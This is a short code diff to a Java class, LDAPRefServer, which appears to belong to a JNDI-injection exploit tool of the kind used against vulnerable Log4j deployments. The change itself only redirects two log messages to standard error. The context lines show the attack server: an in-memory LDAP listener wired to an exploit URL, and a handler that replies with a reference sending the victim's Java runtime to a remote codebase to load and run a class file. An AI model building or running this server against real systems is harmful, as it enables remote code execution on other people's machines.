@@ -65,7 +65,7 @@ public class LDAPRefServer extends Thread {
 
 			config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(LDAP_PATH_TO_EXPLOIT)));
 			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-			System.out.println("!! LDAP listening on :" + PORT);
+			System.err.println("!! LDAP listening on :" + PORT);
 			ds.startListening();
 
 		} catch (Exception e) {
@@ -106,7 +106,7 @@ public class LDAPRefServer extends Thread {
 
 		protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
 			URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
-			System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
+			System.err.println("Send LDAP reference result for " + base + " redirecting to " + turl);
 			e.addAttribute("javaClassName", "foo");
 			String cbstring = this.codebase.toString();
 			int refPos = cbstring.indexOf('#');
